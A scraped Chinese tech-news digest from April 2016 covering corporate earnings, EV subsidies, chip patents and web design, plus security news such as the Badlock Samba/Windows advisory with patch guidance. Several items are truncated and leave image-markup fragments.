-----------------------------------------------------------0-----------------------------------------------------------
0X0: 
     [04.28]索尼上财年扭亏为盈：全年净利润13.6亿美元 


索尼今天发布公告称，该公司在截至3月31日的财年内实现净利润1478亿日元(约合13.6亿美元)，表明这家过去10年来多数时候都难以盈利的日本电子巨头终于迎来了业绩拐点。
索尼之前预计全财年净利润为1450亿日元，而根据FactSet的调查，24位分析师平均预计该公司实现净利润1470亿日元。索尼上财年净亏损1260亿日元。
由于重组接近尾声，该公司CEO平井一夫表示，最新财报成为了索尼新的开始。该公司现在希望通过销售PlayStation游戏机、成像传感器以及音乐和电影来实现营收增长。
该公司目前希望，包括电视机和便携音乐播放器在内的消费电子产品能够保持稳定盈利，而不会以大幅扩大营收为目标。
在与韩国竞争对手争夺消费电子市场的过程中，索尼曾经以牺牲利润为代价来提升营收，导致其陷入多年亏损。索尼自2008年以来每一财年都出现净亏损，只有截至2013年3月的财年是个例外，该公司当年出售了包括房地产在内的大量资产。
在截至今年3月的财年内，索尼实现营业利润2942亿日元，实现营收8.1万亿日元。分析师之前预计该公司全年营业利润为3364亿日元，营收为8.1万亿日元。索尼上一财年营业利润为685亿日元，营收为8.2万亿日元。




-----------------------------------------------------------1-----------------------------------------------------------
0X1: 
     [04.27]新闻早知道：苹果财报03年以来最差，Twitter业绩喜忧参半 

苹果公布2003年以来最差业绩，iPhone销量首次下滑=700) window.open('http://n.sinaimg.cn/tech/transform/20160427/Z-Sf-fxrpvcy4529124.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------2-----------------------------------------------------------
0X2: 
     [04.27]德国政府坐不住了：考虑补贴13亿美元鼓励电动汽车消费 


据《华尔街日报》报道，知情人士透露，德国财政部计划提供12亿欧元(约合13.5亿美元)补贴，希望通过政府和汽车行业买单的方式，促进这个欧洲最大汽车市场的疲软电动汽车销量。
本周二，包括德国总理默克尔在内的政府官员将会见汽车行业的代表，他们有望在此次会议上讨论为电动汽车提供补贴，并通过政府资金来建设全国性的充电网络。
知情人士表示，根据这项提议，购买电动汽车的消费者将有资格获得5000欧元的补贴，而购买插电混动汽车的消费者则可以获得3000欧元补贴。全额补贴将从今年开始生效，一直持续到2018年夏天，之后的补贴则会降至电动汽车3000欧元、混动汽车2000欧元。
知情人士还透露，售价超过6万美元的电动汽车无权获得补贴，主要是为了避免为富人提供补贴。此项补贴将遵循“先到先得”的原则，一旦12亿欧元预算用尽，项目便会终止。
知情人士表示，德国财政部还准备划拨3亿美元来为这款汽车设立充电站。
德国政府发言人拒绝对该提议发表评论，但承认周二的会议将会探讨电动汽车扶持计划。
默克尔计划在2020年之前让德国的电动汽车保有量达到100万辆，但汽车行业高管表示，除非政府为消费者提供补贴，否则他们无法实现这一目标。他们表示，只有提供了相似补贴计划的国家才能实现电动汽车的销量大幅增长。
汽车行业希望借助政府补贴帮助新型的电动汽车和混动汽车实现快速增长。欧洲去年的新增电动汽车销量翻了一番多，达到146,161辆。
德国去年的新增电动汽车销量仅为23,481辆，欧洲最大的电动汽车市场是荷兰和挪威，这两个国家去年新增电动汽车销量分别为43,441辆和33,721辆。




-----------------------------------------------------------3-----------------------------------------------------------
0X3: 
     [04.27]三星可能会与苹果和解：但是背后的“代价”有点大 


在与苹果展开了持续数年的法律和商业斗争后，三星电子可能会与该公司达成和解，但却有可能因此预付90亿美元扩充产能。
知情人士表示，三星正在与苹果展开谈判，希望成为明年发布的iPhone显示屏的独家供应商。不过，该公司需要斥资建设足够的OLED产能，这种显示屏比当今多数智能手机的显示屏都更薄、更亮，耗电也更少。
倘若二者达成协议，就将帮助三星扭转两年的智能手机份额、营收和利润下滑趋势。该公司今年1月对2016年的业绩发出预警，所以与苹果签约可能也会吸引中国智能手机厂商通过升级来保持竞争力。
“对三星来说，这笔投资的风险起初似乎很大，但却可以获得不俗的回报。”投资银行HMC Investment Securities分析师格雷格・罗(Greg Roh)说，“一旦苹果采用新屏幕，其他企业只能跟进。”
据媒体报道，三星显示器公司可能至少要花费10万亿韩元(约合87亿美元)扩充OLED产能。苹果去年iPhone销量为2.31亿部，三星显示器公司每月产能约为300万片，如果要与苹果保持步调一致，三星必须将产能扩大至少6倍。
三星电子拥有三星显示器公司85%的股份。三星显示器公司拒绝对此置评。
苹果发言人也尚未发表评论。
三星电子将于本周四公布第一财季业绩，包括净利润和部门业绩。分析师估计该公司当季利润为4.42万亿韩元，同比下滑2%。




-----------------------------------------------------------4-----------------------------------------------------------
0X4: 
     [04.27]LG Display第一季营业利润骤降95% 仍超预期 

LG Display周三发布公告称，该公司第一财季营业利润同比骤降95%，但仍超出市场预期。不过，这一数据仍然创下4年来的最糟糕业绩，主要原因是疲软的需求打压了显示面板价格。
作为全球顶尖的液晶显示面板制造商，LG Display之前就曾经因为全球经济疲软和行业供给过剩发出过警告。市场研究公司IHS表示，液晶面板价格在今年3月的表现普遍疲软。
LG Display第一财季实现营业利润395亿韩元(约合3443万美元)，而根据汤森路透对26名分析师进行的调查，市场平均预计该公司当季亏损780亿韩元。这是自2012年第一财季营业亏损2110亿韩元以来，该公司发布的最糟糕业绩。
LG Display为苹果iPhone和LG电子的电视机等产品供应显示面板，该公司表示，按照面积计算，第一财季面板出货量环比减少7.7%，而平均售价也下跌17%。
LG Display CFO Don Kim在公告中说：“与第一财季相比，2016年第二财季面板出货量有望实现5%左右的增长。”该公司还预计，由于国际体育赛事的举行，加之新产品出货量增加，面板价格将会趋于稳定。
零部件成本下降以及有利的汇率因素促使部分分析师上调了对LG Display今年1月至3月的盈利预期。当季韩元对美元的平均汇率下跌8.4%。
市场研究公司TrendForce表示，大尺寸电视机面板可以提供更丰厚的利润，而得益于新产品的发布和中国劳动节前订单增长，这类产品的需求将会在第二财季有所增加。
分析师表示，在欧洲杯和里约奥运会等重大体育赛事开幕前，电视的需求也会增长，从而在第二财季为该公司提供喘息的机会。
LG Display第一财季营收同比下滑15%，至6万亿韩元。




-----------------------------------------------------------5-----------------------------------------------------------
0X5: 
     [04.27]无人机与人类碰撞的问题怎么解决？看Google怎么做的 

=700) window.open('http://n.sinaimg.cn/tech/transform/20160427/m15R-fxrpven5028897.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------6-----------------------------------------------------------
0X6: 
     [04.27]裁员1.2万人后，英特尔CEO公布新目标 

=700) window.open('http://n.sinaimg.cn/tech/transform/20160427/3nHe-fxrpvea1299302.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >英特尔CEO科再奇



-----------------------------------------------------------7-----------------------------------------------------------
0X7: 
     [04.27]中国成芯片专利申请第一大国 申请量增长了23倍 


手机圈曾经流传着这样一个段子：苹果一“饥渴”，其他手机品牌就要挨饿。其实说的是由于高端芯片供应有限，在芯片厂商选择客户时，国产手机厂商只能“稍等片刻”。
　　如今，虽然苹果已走下神坛，但背后折射出的畸形的商业生态状况依然存在，“一芯难求”的局面仍然困扰着渴望走高端路线的终端手机厂商。而在其他领域，虽然如华为海思、中兴微电子等国产芯片的自给率逐年提高，但在对稳定性和可靠性要求很高的通信、工业、医疗以及军事的大批量应用中，依然是国际芯片厂商的天下。
　　中国社科院在2014年《经济蓝皮书》中指出，中国工业虽然存在产能过剩状况，但很多行业的高端环节大量依赖进口，例如，芯片90%依赖于进口，每年进口额超过石油。
　　“中国的集成电路需求量达到了万亿级别，但和市场需求相比，不到3600亿的中国集成电路产值确实还是不够。”深圳中兴微电子技术有限公司副总经理刘新阳在4月26日知识产权日上对第一财经记者表示，全球芯片专利数量在过去18年里实现了6倍的增长，而中国芯片则实现了23倍的增长，从数量上中国已经成为芯片专利申请第一大国。
　　“相比国际企业，中国的集成电路企业需要补的课太多，但要想不受制于人，就必须找到自己的长处，逐步追赶，5G设备上有很多的机会。”刘新阳说，中兴微电子希望在5G终端芯片领域做到全球前三。
　　“空心之忧”下的追赶
　　中国半导体产业协会发布的数据显示，去年12月份全球芯片销售额较上年同期下降5.2%，全年销售额略低于2014年的历史最高水平，其中，中国市场增长7.7%，为销售额唯一增长地区。
　　从体量上看，中国目前已经成为全球最大、增长最快的集成电路市场，2014年市场规模首次突破万亿。
　　“中国集成电路的发展是极为快的，在芯片产业涉及到的几个领域中，IC设计增长38.7%，IC制造业增长25%，IC封装业则增长达到16.9%，对比全球个位数的增长，呈现爆发趋势。”刘新阳对记者表示，去年中兴微电子出货量相比2014年有成倍的增长，其中核心的4G芯片增长达到10倍。
　　刘新阳说，虽然起步较晚，但从追赶的速度来说，中国企业具有在某一领域赶超欧洲企业的技术实力。
　　“过去我们说IC的投入有三高，高风险、高投入、高产出，对于资金的需求非常大，随着摩尔定律的演进，现在要做16纳米的芯片，投入的资金金额不能低于亿元级别。”刘新阳表示，但目前中国企业迎来了较好的发展机遇，国家集成电路产业投资基金的支持，资本推动的支持，让有技术积累的企业有更多的空间发展。
　　在国际专利检索公司QUESTEL发布的《芯片行业专利分析及专利组合质量评估》报告中，中国企业在芯片专利数量上已逐步赶上国外老牌企业。
　　但也有业内人士提出质疑，认为目前在很多高精尖的领域中，如高速光通信接口、大规模FPGA、高速高精度ADC/DAC等主要依赖美国供应商。对此，刘新阳对记者表示，从光到电，电到数字需要一些转换的技术，我们把这块的技术叫做ADDA，但很多国内的团队都在做技术积累，国家也在支持，会有实现突破的机会。
　　“手机这块我们已经建立起了自己的射频团队，也有自己的产品，目前五模的芯片可以使用自己的。而在基站的处理器等产品上，基本可以做到自己供应。”刘新阳说。
　　“超车”的机会
　　据QUESTEL报告统计，中国芯片专利申请量从2001年之后出现稳定增长，自2010年后申请节奏显著加速，技术创新越来越活跃，整体水平越来越高，对芯片行业的知识产权保护更加重视，到2012年超过3万大关。在全球芯片专利申请量前30位专利权人中，日本公司居多，日立、东芝和NEC排名前三位，其次是美国的IBM、英特尔、德州仪器、高通等老牌企业，中兴通讯、华为的专利申请在国内企业当中排名靠前。
　　但和国际厂商相比，手机中国联盟秘书长王艳辉认为仍有天然的差距。他对记者表示，目前国产芯片厂商和国际厂商的差距主要体现在几个方面：一是商业模式上的差距，美国有很多IDM公司，韩国有从头到尾的产业链，中国各自为战，没有清晰的模式；二是龙头企业差距，国内企业的销售额和生产规模与欧美公司相比有一定的距离；三是生产工艺和技术上差异；四是资本差距，有传言称国内集成电路制造行业全行业的研发投入不及英特尔一家的六分之一。
这意味着，由于难以依靠自身积累完成再投资和持续的研发投入，中国芯片厂商从一开始就输在了起跑线上，但在很多厂商看来，这并不代表未来没有“超车”的机会。
　　“华为对于芯片的研究从1991年就开始了，海思芯片去年也实现了5000万片的发货。”华为轮值CEO郭平对记者如是说。
　　而刘新阳也认为在5G时代，中国厂商，特别是具有通信能力的厂商在集成电路领域有更多的优势。“5G技术有更多的连接，可以解决物联网多连接、低延时的需求，这都是中兴微所擅长的领域。”他认为，智能制造和物联网需要集成电路提供更多的智能化或者通信的能力，包括计算、存储、无线控制，同时也联接更多的终端。
　　“终端芯片应用趋势上会与智能家庭结合，与未来多媒体数据中心结合，整体市场有很大潜力。”王艳辉对记者表示，从2016年市场，智能终端品类向更宽泛的形态发展，而智能终端市场的活跃会让中国芯片产业有弯道超车的机会。




-----------------------------------------------------------8-----------------------------------------------------------
0X8: 
     [04.27]苹果业绩终现下滑：iPhone再也不能挤牙膏了 


2016年第一季度，对苹果来说有着苦涩的滋味。就在这个季度，苹果不仅结束了连续13年财报增长的势头，更出现了两位数的明显下滑。从某种程度上来说，苹果尝到了2014年第四季度三星遭受的痛。
　　先来看苹果当季财报。当季营收下滑13%，至506亿美元。净利润下滑22%，至105亿美元。更为糟糕的是，这一业绩双双低于分析师此前预期。受此影响，美东时间下午5时，苹果股价在盘后交易中暴跌8%，市值短时间内蒸发了400亿美元。
　　实际上，这份业绩并不能说是完全令人意外。早在上个季度财报中，在原本传统旺季的去年第四季度，苹果核心业务iPhone销量增长已经陷入停滞。而且当时苹果就已经提前预警，今年第一季度业绩可能会出现下滑。
　　具体分析来看，近年来苹果业绩之所以能够持续强劲增长，主要是得益于iPhone和中国市场的出色表现。而此次苹果业绩之所以会出现滑坡，也主要受到这两大增长引擎的骤然下滑拖累。
　　当季苹果iPhone销量同比下滑16%，至5120万部；营收同比下滑18%，至329亿美元。大中华区营收下滑26%。此外，苹果最大的美国市场也营收下滑10%。在这种情况下，苹果业绩下滑也是意料之中的事情。
　　第三方市调公司TrendForce的数据更加令人担忧。根据他们的第一季度全球智能手机出货数据，苹果当季出货量仅为4200万，市场份额急剧下滑至14.4%，几乎只有三星的一半(8100万与27.8%)。要知道，在2014年第四季度，iPhone市场份额还一度追平三星。
　　iPhone的市场份额下滑无疑在情理之中。2014年iPhone井喷式的增长，更多的是建立在推出大屏iPhone收割了此前积压的用户需求以及Android高端市场的基础之上。而在分析人士看来，这种增长更有可能是一次性的。
　　在随后的一年半时间内，iPhone的销量增幅不断下滑，直至去年第四季度的陷入停滞，直至今年第一季度的明显下滑。这其中的因素包括：高端智能手机市场出现饱和迹象，去年发布的iPhone 6s和6s Plus升级幅度不够吸引用户升级(这一点是核心原因)，三星推出S7和S7E在高端市场出现明显回升，华为、小米等性价比手机在中国市场继续热销，中国乃至全球经济前景不明朗影响消费支出。
　　苹果在第一季度末推出小屏iPhone SE，是希望在今年9月的iPhone新旗舰公布之前，通过细分市场来尽可能缓解iPhone销量下滑的趋势。这一产品或许能在第二季度给苹果带来急需的新鲜血液。
　　除了核心的iPhone业务，无论是iPad、Mac、苹果手表等其它业务，要么已经随整个行业陷入衰退，要么还处在非常初期的阶段，都无法给苹果带来新的增长推动力。当季iPad营收下滑19%，Mac营收下滑9%。
　　或许当季业绩最大的亮点是苹果iTunes等服务业务，当季同比增长20%，达到60亿美元。考虑到目前苹果有5亿活跃设备用户，服务业务未来依然有较大的增长空间。
此外，美元走强也给苹果、微软以及谷歌等跨国企业带来了明显不利影响。苹果CFO在财报会议上透露，如果只看中国大陆市场，当季营收只下滑了11%。因为香港汇率随美元波动，营收下滑幅度要大得多。
　　在业绩陷入低谷的情况下，苹果董事会的现实手段就是通过资本提振股价。在低迷财报公布后，苹果宣布将季度股息提升10%，至每股57美分，同时将股票回购规模上调至1750亿美元。
　　苹果毕竟是全球最大的科技公司。目前的业绩下滑究竟是一个局面扭转点，还是暂时的挫折，前景其实把握在苹果自己手中。如果今年秋季的iPhone 7(或者任何其它名字)能够拿出类似iPhone 4那年颠覆性的创新，那么苹果依然有望再次推动巨轮前行。或许，苹果再也没有挤牙膏小幅升级的资本了。
　　此外，苹果依然有高达2330亿美元的现金头寸，在内部增长陷入停滞的情况下，或许通过收购带来新的增长点变得更为可行和急迫。




-----------------------------------------------------------9-----------------------------------------------------------
0X9: 
     美的事物里都有黄金比例，你看出来了么？ 

问：金字塔、蒙娜丽莎、Twitter和百事可乐有什么共同点?

答案很简单，它们的设计都遵循了黄金比例。作为一个常见的数学比例，黄金比例实际上是从自然界中总结并发现的，用于设计中的时候能赋予作品更多的设计美感，赏心悦目。

黄金比例应用在平面布局各个领域中，特别是能够平衡文本内容的权重。 它可以帮助设计者创建层次结构以及吸引用户对特定区域的关注。

那么，黄金比例到底是怎么样的比例，它又是如何运用到网页设计中并提升设计作品的呢?

黄金比例是一个比较特殊的数学比例，通常我们会用线段分割来解释这个比例：把一条线段分割为两部分，较短部分与较长部分长度之比等于较长部分与整体长度之比，其比值是一个无理数，取其前三位数字的近似值是0.618。

当然，我们今天探讨的并非是数学问题，而是设计和美。黄金比例之所以被冠名以“黄金”二字，自然是因为这个比例带来的和谐与美感。当你应用到设计作品中的时候，这种比例会营造出艺术感。

黄金比例自然会吸引用户的眼睛到页面上某个特定的点。作为一个概念，它可以帮助你思考内容的布局以及有效利用层次结构，组合布局，排版，色彩和总体原则，将有助于将你的设计水平提升到一个新的阶段。
也许有的设计师会认为使用这些所谓的规范性东西会是一种限制而不是创造，在我看来这些新的概念对网页设计来说是一种尝试和提升，会给你接下来的创意构思提供一个坚实的基础，让人从一个新的视角来看待好的网页设计。

许多设计师在设计版面的时候都是随意制定一下宽度就开始他们的设计，往往会出现挑选的宽度没有考虑到说要表现的内容，在后期出现内容问题的时候就很受限制。还有很多开发人员在实现页面的时候，并没有完全依靠视觉效果图来实现，有时就大致量了一下然后根据以往经验来定制宽度，而这种宽度往往不能很好的适应他们的内容，所以，这时候，黄金比例的使用就很重要了。

在设计中使用黄金比例的5种方法

1
、布局：将尺寸设置成黄金比例

在布局中使用黄金比例的方法并不难，关键是控制比例和尺寸。重点很简单，把握好1:1.618的黄金比例。

举个例子，使用960px的宽度布局的时候，除以1.618可以得到594px，这个可以用作你的布局的高度，然后将整个布局划分为两栏，一栏方形，一栏矩形，一个协调的布局就出来了。

这种两栏式布局在网页上非常实用，我们所熟知的美国国家地理的网页就是使用的这样的布局方式，看起来可读性非常不错，比例平衡，符合网站内容自然的特性。

国家地理
　　2
、间距：使用黄金螺旋布局

　　间距的控制和留白一样，是设计中非常关键的元素。协调的布局能够营造出优秀的作品，那么如何借助黄金比例来协调页面中的多种元素呢?合理的计算有的时候比直觉合适，如果能结合起来就更好了。

　　在基本的布局上，借助黄金螺旋来调整，是个不错的思路。多种不同的元素在同一页面上的时候，黄金螺旋可以帮你筛选出合理的空间布局和间隙。

　　3
、内容：沿着黄金螺旋的轨迹

　　对于网页内容而言，黄金螺旋的轨迹同样可以起到重要的作用。我们的视觉可以很自然地沿着黄金螺旋的轨迹运动，这也就是说这样设计网页布局会让访客更加自然地浏览内容。

如果你仔细查看美国国家地理的网页，会看到它们的网页布局就是如此，用户会下意识地随着这个布局来浏览，这是一种潜意识行为。

国家地理2
　　4
、图片：黄金比例和三分法

　　对于图片而言，布局自然是很重要的，无论是用来传递信息还是呈现图像布局的美感。黄金比例可以让图片变得更加吸引眼球，让重要的信息脱颖而出。平时我们所说的三分法布局，如何结合黄金比例，可以让布局更漂亮。

　　5、图形：黄金比例圆形

　　黄金比例可以用来创建矩形也能用来创建比例协调的圆形。使用黄金比例不仅可以产生和谐的比例，而且能够让图形保持较高的一致性。从百事和Twitter的LOGO来说说这个事情吧。

百事的LOGO是使用两个遵循黄金比例的圆圈来构建的，较小圆形并不是显而易见的那种，而是隐藏在内部的曲线中。

百事logo
Twitter
的LOGO设计则是借助若干完美的圆形来进行构建的，只不过它在使用黄金比例的圆形的时候，并没有使用相邻比例的圆形来构建，乍一看不够精确，但却同样营造出和谐的标识。

Twitterlogo




-----------------------------------------------------------10-----------------------------------------------------------
0X10: 
     [04.25]新型跨平台的键盘记录恶意软件PWOBot曝光 

最近，安全研究人员发现了一款具有潜在威胁的跨平台恶意软件家族――PWOBot。
=700) window.open('http://www.freebuf.com/buf/themes/freebuf/images/grey.gif')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------11-----------------------------------------------------------
0X11: 
     [04.25]澳大利亚政府公开网络安全战略 

近日，澳大利亚政府公开了他们的网络安全战略，4年内计划花费近2.3亿澳元在国家重要基础设施的攻击防护上，并承认他们具有极强的发动网络攻击的能力。

这个战略非常的完善，有对国有行业和私人行业的防护，还为5000家中型企业和信息分享活动所做的安全测试提供了资金支持。


澳大利亚政府花高额费用在网络安全上


首相Malcolm Turnbull列出了一个在网络安全方面的投资清单，政府将计划拿出2.3亿澳元用于网络安全方面，包括成立网络威胁中心。3000万澳元用于建立网络安全增长中心，目的是协调国家网络安全创新中心；4700万澳元将用于在重要城市建立情报分享中心。
=700) window.open('http://image.3001.net/images/20160422/14613143576139.jpg!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------12-----------------------------------------------------------
0X12: 
     额 

无聊ing




-----------------------------------------------------------13-----------------------------------------------------------
0X13: 
     [04.22]微软公布第三财季财报：净利润同比降25% 




=700) window.open('http://image.sinajs.cn/newchart/png/min/us/msft.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >查看最新行情




-----------------------------------------------------------14-----------------------------------------------------------
0X14: 
     [04.22]Petya中的Salsa：算法修改带来的缺陷 

此前哈勃分析系统介绍过关于修改MBR进行磁盘加密敲诈的木马Petya（http://www.freebuf.com/articles/web/100386.html）。最近Leo Stone给出了破解Petya密钥的完整爆破代码和解密工具，并指出Petya作者是采用变种的Salsa20算法来进行密钥的校验。通过查阅其给出的源代码并结合Salsa算法的说明，可以还原出Petya对算法所进行的修改，以及其流程的具体逻辑。


Salsa20

Salsa20是由Daniel J. Bernstein发明的一种分组加密算法，可以对最长2^70字节的数据进行加密，其中分组长度为2^6=64字节。此算法是对称加密算法，并且加密和解密操作是等价的，即对明文用同一密钥进行2次加密可以得到还原的明文。


Salsa的输入

Salsa需要如下输入数据：

Key: 密钥，16或32字节；
IV: 初始向量，8字节；
Round: 计算轮数，取值为8、12或者20；
Message: 明文，不超过2^70字节。Salsa的输出Ciphertext是与Message等长的加密数据。
官网引用了一个Python语言的Demo，其中给出的用法如下：
[/url]



-----------------------------------------------------------15-----------------------------------------------------------
0X15: 
     [04.22]通杀Windows的Badlock是啥？该如何修复？ 

 Badlock Bug
 
Badlock Bug简介
 
2016年4月12日，Windows 和 Samba 中揭露出了一个非常关键的安全漏洞。
Samba 4.4.2，4.3.8 和 4.2.11 安全更新可用。
请更新你的系统。我们非常确定黑客很快就会利用这个漏洞进行攻击。
微软和 Samba 团队的工程师们在过去几个月里精诚合作一起修复这个 bug。
 
 
Q&ampA
 
Badlock 有 CVE 吗？
有。针对 Samba 的 Badlock 被 CVE－2016-2118 引用（可能的中间人攻击中的 SAMR 和 LSA），针对 Windows 的 Badlock 被 CVE－2016-0128/MS16-047（Windows SAM 和 LSAD 的降级漏洞）。
其他有关 Badlock 的 CVE。那些是：

CVE-2015-5370 (DCE-RPC 代码的多个错误)
CVE-2016-2110 (使用 NTLMSSP 进行中间人攻击)
CVE-2016-2111 (NETLOGON 欺骗漏洞)
CVE-2016-2112 (LDAP 客户端和服务端没有强制完整性)
CVE-2016-2113(缺少 TLS 证书验证)
CVE-2016-2114 (“server signing = mandatory” 不执行)
CVE-2016-2115 (SMB IPC 流量没有完整性保护)
 
攻击者可以得到什么？
 
该安全漏洞可以分为中间人和拒绝服务攻击。
1. 中间人攻击（MITM）：
很多中间人攻击都可以被执行对抗各种使用Samba的协议。这会允许使用截获用户上下文的任意Samba网络调用被执行。
影响截获管理员通信的例子：
1）. Samba AD 服务器 － 查看或修改 AD 数据库中的秘密信息，包括用户密码哈希或者关机等关键服务等。
2）. 标准 Samba 服务器 － 修改文件或目录等访问权限。
2. 拒绝服务攻击（DoS）：
Samba服务很容易受到来自攻击者从远程网络连接到Samba服务器的Dos攻击。
谁被感染了？
Sanba受影响的版本是：

3.6.x,
4.0.x,
4.1.x,
4.2.0-4.2.9,
4.3.0-4.3.6,
4.4.0没有评估更早期的版本。
 
 
如何修复我的系统？
 
请立刻申请由 Samba团队和 SerNet 提供的企业版 SAMBA／SAMBA+ 补丁。
补丁版本（包括临时和最终发布的补丁）：

4.2.10 / 4.2.11,
4.3.7 / 4.3.8,
4.4.1 / 4.4.2.使用3月22日发布的 Samba 4.4.0的4.1版本分支已经被标注为 DISCONTINUED 已停产（详见 Samba 发布计划）。请注意，即使对于安全修复来说 Samba 4.1 及以下版本不在支持范围内。Samba 团队和 SerNet 不再为 Samba 4.1 及以下版本 提供官方安全版本（对企业版SAMBA）。我们强烈建议用户升级到更新后的安全版本。
有些厂商可能会选择4.4.1，4.3.7和4.2.10版本的 Samba，并在这些版本中安装补丁，因为这次发布的规模很大并且复杂性很高。有些人可能只是在旧的版本中backport这些补丁。请联系您的 Samba 供应商获取详细信息。
 
 
修复之后有什么进一步更改建议？
 
对于中间人攻击的缓解：
可以被中间人攻击使用的网络协议包括DHCP侦听，ARP监测和802.1x。
如果网络环境兼容，我们建议管理员设置这些附加选项：
server signing = mandatoryntlm auth = no
如果没有 server signing = mandatory，中间人攻击中的攻击者仍然可能对我们的文件服务器和 classic/NT4-like/Samba3 域控制器进行攻击。（现在强制在 Samba的 AD DC上执行。）请注意，这些对文件服务器性能有非常严重的影响，所以你需要对性能和安全性对出选择。对于smb文件服务器来说，中间人攻击在几十年中已经众所周知了。
如果没有 ntlm auth = no，可能仍是不使用NTLMv2的客户端，而这些观察到的密码可能很容易被使用云计算资源或彩虹表被蛮力攻击。
对于拒绝服务（DoS）攻击的缓解：
在服务器上应用防火墙规则只允许从受信任的地址进行连接。
加密能抵御这些攻击吗？
在默认情况下，当文件被明文传输时，SMB协议只加密凭证和命令。在安全／隐私敏感的情况下，建议使用加密来保护所有通信。
Samba 在2008年的3.2版本中增加了加密功能，但仅限于 Samba 客户端。微软增加了SMB加密支持Windows 8和 Windows Sever 2012中的 SMB 3.0。然而，这两种类型的加密只在 SMB 协议和命令完成后保护通信，比如文件传输等通信。正是这种机制存在修复的漏洞。
Samba／SMB 加密是一种非常不错的方法，但是不能有效的防止漏洞被利用。网络层的机密，比如IPSec 需要才是提供全方位保护的好方法。
 
 
Badlock 有多糟糕？
 
根据通用安全评分系统（CVSS），Badlock的严重性：
CVSS:3.0/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
Base: 7.1 (High) Temporal: 6.4 (Medium)
当前如何利用此漏洞？
因为我们已经有几个 PoC，所以它极有可能被利用（这几个 PoC 不会在之后发布）。
Badlock 代表什么？
“Badlock” 本来是一个通用名次，没有任何特殊内涵。
但是这个 Bug 为什么有特殊表达方式？
被标记的 bug 可以用一个词非常好的形容：广泛性即被大众所认识。而且，bug 的名字可以作为独特的标识符，跟CVE／MS bug 作区分。
大家应该认真对待严重的漏洞。这个过程不是从标志它开始的，它开始于一段时间以前，当时每个人都在尽全力修复它。这个公告的主要主要目的是在安全修复发布之前通知用户。这是 Samba 安全发布过程的一部分。
谁发现了 Backlock 漏洞？
Badlock 被 Stefan Metzmacher 发现。他是国际 Samba 核心团队中的一员，他在 Samba 的SerNet工作。他向微软报告了这个 bug，并与微软密切合作共同修复这个 bug。
 





-----------------------------------------------------------16-----------------------------------------------------------
0X16: 
     [04.22]Win32.Adware.ADClick分析报告 



0×00引言

每个讨厌的广告弹窗背后总有一个精心筹谋的心机。腾讯反病毒实验室近日捕获到一款病毒，通过释放多个文件到系统目录，并将自身注册为启动项，致使用户每次开机时电脑桌面都会自动弹出广告窗口。下面我们分析该病毒是如何通过“无进程”技术隐匿在计算机中，向用户弹出有针对性的定向广告。


基本流程:

=700) window.open('http://image.3001.net/images/20160421/14612105401840.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------17-----------------------------------------------------------
0X17: 
     [04.22]Anonabox路由：可以保障用户通过匿名身份使用Tor和VPN 

=700) window.open('http://image.3001.net/images/20160420/14611371892328.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------18-----------------------------------------------------------
0X18: 
     [04.22]预测85%的网络攻击：麻省理工学院研发人工智能系统AI2 

=700) window.open('http://image.3001.net/images/20160421/14612358004259.jpg!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >




-----------------------------------------------------------19-----------------------------------------------------------
0X19: 
     [04.22]GozNym恶意软件盯上加拿大和美国的银行系统 

美国和加拿大的银行系统正在经受双重威胁，该威胁就是结合了Nymaim与Gozi ISFB的功能强大的恶意软件――GozNym。
 =700) window.open('http://image.3001.net/images/20160421/14612306309196.gif!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------20-----------------------------------------------------------
0X20: 
     [04.22]PowerWare：勒索软件如何温柔地借刀杀人 

2016 年 3 月底，一个名为 PowerWare 的新型加密勒索软件通过钓鱼邮件袭击了一家医疗组织，被国外安全公司 Carbon Black 捕获。PowerWare 最大的特点是核心的加密勒索功能由 Powershell 脚本实现，通过简单的社会工程学伎俩诱骗用户允许它的恶意动作，导致其调用 Windows 系统本地自带的 Powershell 框架执行加密勒索行为。
Windows PowerShell 是一种命令行外壳程序和脚本环境，它内置于 Windows 系统本地环境，需要 .NET 环境支持。类似 Linux 下的 Shell，命令行用户和脚本编写者可以通过 Powershell 利用 .NET Framework 的强大功能，实现高效的文本处理、系统管理甚至编写脚本实现相当复杂的功能性程序。它引入了许多非常有用的新概念，从而很大程度上扩展了在 Windows Cmd和 Windows Script Host 环境中获得的功能。
PowerWare 的核心技术原理，可以类比为“借受害用户之刀（Powershell），伤用户自己”。


传播方式

PowerWare 通过钓鱼邮件传播。其传播载体是一份带有宏脚本的恶意 Word 文档，当受害用户打开恶意文档的时候，如果 Office 软件没有启用宏功能，该文档会提示需要开启宏功能允许脚本执行，诱导受害用户启用宏功能；如果 Office 软件已经开启了宏功能，该文档中的恶意宏脚本会直接执行。
=700) window.open('http://image.3001.net/images/20160412/1460470371831.png!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >



-----------------------------------------------------------21-----------------------------------------------------------
0X21: 
     [04.21]FreeBuf独家：黑客攻防人机大战，我们将看到什么？ 

*本文根据诸葛建伟、姜开达等著名高校安全界代表、学术人物专访撰写，FB编辑部出品

CGC(Cyber Grand Challenage) 为美国DARPA(国防高等研究计划署)举办的自动网络攻防竞赛。一般CTF（Capture the Flag）竞赛需要大量人力参与分析，而实际网络攻防也面对相同问题，需要花费大量人力来应对新的攻击，造成从攻击出现到防御机制生效中间有较长时间，也就是我们常听到的0day所造成的网络安全问题。
